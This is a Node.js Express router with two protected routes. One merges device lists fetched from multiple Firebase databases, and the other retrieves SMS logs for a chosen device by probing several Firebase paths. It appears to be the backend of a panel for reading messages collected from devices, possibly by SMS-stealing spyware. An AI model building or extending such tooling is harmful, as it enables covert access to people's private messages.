const express = require('express');
const router = express.Router();
const Source = require('../models/Source');
const { protect } = require('../middleware/authMiddleware');
const axios = require('axios'); // We need axios for fetching from Firebase. Let's install it.

// Helper to fetch and optionally use an auth token
const fetchFirebase = async (url) => {
    try {
        const response = await axios.get(url, { timeout: 10000 });
        return response.data;
    } catch (error) {
        return null;
    }
};

// @route   GET /api/devices
// @desc    Fetch all devices from allowed Firebase Sources and merge them
// @access  Private
router.get('/devices', protect, async (req, res) => {
    try {
        // Find sources user has access to. 
        // Admins can see all global sources (owner: null) and their own.
        // Users can see global sources (owner: null) AND their own private sources.
        const query = { $or: [{ owner: null }, { owner: req.user._id }] };
        const sources = await Source.find(query);

        let mergedDevices = [];

        await Promise.all(sources.map(async (src) => {
            // NOTE: Add logic later to anonymously authenticate if src.apiKey exists
            // For now, assume public `.json` endpoints for simplicity in the proxy MVP
            const data = await fetchFirebase(`${src.base}/clients.json`);
            if (data && typeof data === 'object') {
                const entries = Array.isArray(data) ? data.map((v, i) => [String(i), v]).filter(x => x[1]) : Object.entries(data);
                for (const [id, info] of entries) {
                    if (info && typeof info === 'object') {
                        mergedDevices.push({
                            _id: id,
                            _src: src.key,
                            _base: src.base,
                            ...info
                        });
                    }
                }
            }
        }));

        res.json({ success: true, count: mergedDevices.length, data: mergedDevices });
    } catch (error) {
        console.error(error);
        res.status(500).json({ success: false, message: 'Server error fetching devices' });
    }
});

// @route   GET /api/messages/:src/:id
// @desc    Fetch SMS logs for a specific device securely
// @access  Private
router.get('/messages/:src/:id', protect, async (req, res) => {
    try {
        const { src, id } = req.params;
        const source = await Source.findOne({ key: src, $or: [{ owner: null }, { owner: req.user._id }] });
        
        if (!source) return res.status(404).json({ success: false, message: 'Source not found or unauthorized' });

        const paths = [`/messages/${id}.json`, `/clients/${id}/messages.json`, `/sms/${id}.json`, `/clients/${id}/sms.json`];
        let smsData = [];

        for (let p of paths) {
            const data = await fetchFirebase(`${source.base}${p}`);
            if (data) {
                if (Array.isArray(data)) {
                    smsData = data.map((x, i) => x ? { ...x, _fbPath: p, _fbKey: i } : null).filter(x => x);
                } else if (typeof data === 'object') {
                    smsData = Object.keys(data).map(key => ({
                        ...(typeof data[key] === 'object' ? data[key] : { message: String(data[key]) }),
                        _fbPath: p,
                        _fbKey: key
                    }));
                }
                if (smsData.length > 0) break;
            }
        }

        res.json({ success: true, data: smsData });
    } catch (error) {
        res.status(500).json({ success: false, message: 'Error fetching messages' });
    }
});

module.exports = router;
